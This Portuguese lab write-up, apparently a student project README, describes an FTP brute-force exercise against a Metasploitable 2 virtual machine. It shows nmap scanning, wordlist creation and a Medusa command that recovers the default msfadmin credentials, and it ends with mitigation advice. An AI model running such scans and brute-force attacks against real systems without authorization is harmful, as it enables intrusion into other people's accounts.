Auditoria de Serviços Vulneráveis com Medusa, Kali Linux e Metasploitable 2

Este projeto demonstra a execução de ataques de força bruta em ambiente controlado utilizando Kali Linux, Medusa e máquinas vulneráveis (Metasploitable 2 e DVWA). O objetivo é compreender técnicas de ataque, reconhecer vulnerabilidades e aplicar medidas de mitigação.

1. Configuração do Ambiente:

Foram utilizadas duas máquinas virtuais no VirtualBox:

Kali Linux (Atacante)

Metasploitable 2 (Vítima)

Rede utilizada: Host-Only
IP da vítima: 192.168.56.102

Para confirmar o IP:

ip a

Teste de conectividade:

ping -c 3 192.168.56.102

2. Análise do Alvo com Nmap:

A varredura dos principais serviços vulneráveis foi feita com:

nmap -sV -p 21,22,80,139,445 192.168.56.102


Serviços encontrados:

FTP – vsftpd 2.3.4

SSH – OpenSSH 4.7p1

HTTP – Apache 2.2.8

SMB – Samba 3.x – 4.x

3. Teste Manual de FTP:
ftp 192.168.56.102


Tentativas manuais falharam, indicando que seria necessário ataque de força bruta.

4. Criação de Wordlists:

Foram criadas wordlists pequenas para demonstração:

echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt
echo -e '123456\npapassword\nmsfadmin' > pass.txt

5. Ataque de Força Bruta com Medusa:

Comando utilizado:

medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6


Resultado:

ACCOUNT FOUND:
User: msfadmin
Password: msfadmin

6. Validação do Acesso Descoberto:
ftp 192.168.56.102
Name: msfadmin
Password: msfadmin
230 Login successful.

7. Recomendações de Mitigação:

Usar senhas fortes e únicas

Desabilitar serviços desnecessários (FTP, SMB antigos)

Implementar bloqueio por tentativas falhas (Fail2ban, PAM)

Aplicar patches e atualizar serviços antigos

Usar protocolos seguros (SFTP em vez de FTP)
